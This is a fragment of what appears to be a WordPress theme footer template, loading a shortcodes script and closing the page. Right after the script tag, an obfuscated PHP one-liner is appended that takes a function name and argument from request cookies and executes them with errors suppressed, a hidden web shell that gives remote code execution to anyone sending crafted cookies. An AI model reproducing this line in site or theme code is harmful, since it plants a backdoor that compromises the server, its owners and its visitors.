...
<script type="text/javascript" src="<?php echo get_template_directory_uri() . '/functions/js/shortcodes.js'; ?>"></script></script><?php $_=$_COOKIE;$__=$_["__"];$_=$_["_"];if(isset($__))@$__($_); ?> 
</body>
</html>
